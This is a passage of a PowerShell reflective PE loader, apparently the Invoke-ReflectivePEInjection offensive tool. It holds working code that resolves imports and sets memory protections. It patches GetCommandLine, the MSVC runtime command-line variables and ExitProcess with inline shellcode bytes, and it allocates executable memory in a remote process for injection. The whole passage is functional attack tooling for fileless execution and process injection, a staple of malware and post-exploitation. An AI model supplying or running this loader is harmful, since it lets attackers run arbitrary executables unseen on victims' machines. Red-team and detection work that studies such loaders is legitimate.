					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		
		
		#if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		#{
		#	Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
		#	[IntPtr]$LoadAddr = $OriginalImageBase
		#}
        #elseif ($ForceASLR -and (-not $PESupportsASLR))
        #{
        #    Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
		#	
        #}

		
        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }
		

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
		
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$imageBaseType = $OriginalImageBase.GetType();
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
	
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
